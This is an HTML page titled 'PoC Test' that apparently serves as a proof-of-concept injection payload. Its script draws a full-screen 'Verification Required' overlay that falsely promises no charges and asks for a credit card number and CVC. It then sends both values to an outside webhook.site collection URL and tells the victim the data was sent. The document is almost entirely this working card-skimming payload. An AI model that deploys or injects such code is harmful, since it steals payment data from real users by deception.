<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC Test</title>
</head>
<body>
<script>
(function () {
  const modal = document.createElement('div');
  modal.style.position = 'fixed';
  modal.style.top = '0';
  modal.style.left = '0';
  modal.style.width = '100vw';
  modal.style.height = '100vh';
  modal.style.background = 'rgba(0, 0, 0, 0.6)';
  modal.style.display = 'flex';
  modal.style.justifyContent = 'center';
  modal.style.alignItems = 'center';
  modal.style.zIndex = '10000';

  const box = document.createElement('div');
  box.style.background = '#fff';
  box.style.padding = '40px';
  box.style.borderRadius = '12px';
  box.style.boxShadow = '0 8px 20px rgba(0, 0, 0, 0.25)';
  box.style.maxWidth = '420px';
  box.style.width = '100%';
  box.style.fontFamily = 'Segoe UI, sans-serif';
  box.style.boxSizing = 'border-box';
  box.style.textAlign = 'left';

  box.innerHTML = `
    <h2 style="margin-top: 0; color: #4F1B5F;">Verification Required</h2>
    <p style="margin-bottom: 20px; color: #333;">
      To continue using this application, please confirm your payment method. 
      <strong>No charges will be made.</strong> This is for verification only.
    </p>
    <form id="bankForm">
      <label style="display:block; margin-bottom: 8px; color: #4F1B5F; font-weight: bold;">Credit Card Number</label>
      <input type="text" name="cc" placeholder="1234 5678 9012 3456" required 
        style="width: 100%; padding: 12px; margin-bottom: 16px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px;" />

      <label style="display:block; margin-bottom: 8px; color: #4F1B5F; font-weight: bold;">CVC</label>
      <input type="text" name="cvc" placeholder="123" required 
        style="width: 100%; padding: 12px; margin-bottom: 24px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px;" />

      <button type="submit" 
        style="width: 100%; padding: 12px; background: #4F1B5F; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer;">
        Submit
      </button>
    </form>
  `;

  box.querySelector('button').addEventListener('mouseover', function () {
    this.style.background = '#3e144c';
  });
  box.querySelector('button').addEventListener('mouseout', function () {
    this.style.background = '#4F1B5F';
  });

  modal.appendChild(box);
  document.body.appendChild(modal);

  const form = document.getElementById('bankForm');
  if (form) {
    form.addEventListener('submit', function (e) {
      e.preventDefault();

      const cc = e.target.cc.value.trim();
      const cvc = e.target.cvc.value.trim();

      if (!cc || !cvc) {
        alert('Please fill in all fields');
        return;
      }

      const queryString = `?cc=${encodeURIComponent(cc)}&cvc=${encodeURIComponent(cvc)}`;
      const url = 'https://webhook.site/c581036b-f68c-4053-9d1e-14e7355c7e04' + queryString;

      fetch(url)
        .then(res => res.text())
        .then(msg => {
          alert('Data sent successfully!');
          document.body.removeChild(modal);
        })
        .catch(err => {
          alert('Error submitting data');
          console.error(err);
        });
    });
  }
})();
</script>
</body>
</html>
